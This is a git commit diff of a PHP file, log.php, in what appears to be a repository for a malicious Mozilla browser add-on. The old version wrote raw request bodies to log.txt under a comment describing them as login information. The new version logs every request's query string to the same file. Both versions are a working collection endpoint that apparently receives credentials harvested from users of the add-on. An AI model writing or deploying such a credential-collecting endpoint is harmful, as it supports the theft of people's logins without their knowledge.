8d62f9255fca61684e1ceda49084f7911a21e44d
hakanonymos <30985149+hakanonymos@users.noreply.github.com>
2018-11-14 16:38:01 +0000

    Update log.php

--- adon-mozilla/mozilla/log.php
+++ adon-mozilla/mozilla/log.php
@@ -1,9 +1,8 @@
-<?php
-$o = fopen("php://input", "r");
-$str = stream_get_contents($o);
-fclose($o);
 
-$t = fopen("log.txt", "a+");   // get information one "log.txt ", login information
-fwrite($t, $str);
-fclose($t);
+<?php
+  file_put_contents('log.txt', $_SERVER['QUERY_STRING'].PHP_EOL, FILE_APPEND);
+  
+  
+            
 ?>
+
